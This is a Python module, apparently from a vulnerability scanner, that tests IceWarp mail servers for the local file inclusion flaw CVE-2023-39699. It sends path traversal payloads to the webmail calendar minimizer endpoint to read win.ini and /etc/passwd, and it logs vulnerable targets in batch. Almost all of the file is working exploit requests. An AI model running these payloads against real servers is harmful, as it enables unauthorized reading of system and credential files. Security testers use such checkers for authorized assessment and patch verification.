#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2023_39699:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/-.._._.--.._vulscs/webmail/calendar/minimizer/index.php?style=..\..\..\..\..\..\..\..\windows/win.ini'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if req.status_code == 200 and len(req.text) != 0:
                OutPrintInfoSuc("IceWarp", f"存在爱思华宝邮件服务器本地文件包含漏洞 {url2}")

                if self.batch:
                    OutPutFile("icewarp_2023_39699.txt",f"存在爱思华宝邮件服务器本地文件包含漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("IceWarp", f"不存在爱思华宝邮件服务器本地文件包含漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("IceWarp", "目标请求出错")
    def send_payload2(self,url):
        url2 = url + '/-.._._.--.._vulscs/webmail/calendar/minimizer/index.php?style=../../../../../../../../etc/passwd'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if req.status_code == 200 and "root:x" in req.text:
                OutPrintInfoSuc("IceWarp", f"存在爱思华宝邮件服务器本地文件包含漏洞 {url2}")
                if self.batch:
                    OutPutFile("icewarp_2023_39699.txt",f"存在爱思华宝邮件服务器本地文件包含漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("IceWarp", f"不存在爱思华宝邮件服务器本地文件包含漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("IceWarp", "目标请求出错")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("IceWarp", "开始检测爱思华宝邮件服务器本地文件包含漏洞...")
            OutPrintInfo("IceWarp", "开始检测POC-1...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("IceWarp", "开始检测POC-2...")
        self.send_payload2(url)
        if not self.batch:
            OutPrintInfo("IceWarp", "爱思华宝邮件服务器本地文件包含漏洞检测结束")
